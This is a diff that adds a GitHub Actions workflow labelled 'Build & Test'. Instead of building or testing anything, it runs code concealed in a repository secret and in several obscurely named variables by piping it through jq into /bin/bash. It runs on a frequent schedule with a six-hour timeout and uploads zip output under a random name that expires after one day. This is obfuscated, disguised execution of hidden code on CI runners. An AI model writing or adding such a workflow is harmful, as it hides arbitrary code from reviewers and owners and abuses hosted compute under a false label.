@@ -1,0 +1,34 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          fjlh4: ${{ secrets.fjlh4 }}
+        run: |
+          printf '%s' "$fjlh4" | jq -r .oyax98549 | /bin/bash
+          printf '%s' "$zr03" | jq -r .x264 | /bin/bash
+          echo $z5 | jq -r .bxdfw1437 | /bin/bash
+          echo $vxm42811 | jq -r .qw173 | /bin/bash
+          printf '%s' "$kgw89779" | jq -r .qhxu8678 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9u6ZmHuq
+          path: "*.zip"
+          retention-days: 1
